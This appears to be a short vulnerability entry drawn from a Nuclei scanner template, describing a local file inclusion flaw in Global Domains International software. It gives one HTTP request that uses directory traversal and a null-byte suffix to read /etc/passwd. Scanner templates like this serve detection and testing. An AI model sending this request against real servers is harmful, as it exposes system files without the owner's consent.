# Vulnerability: Global Domains International - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`global-domains-lfi.yaml`)

## Description
Global Domains International is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
```

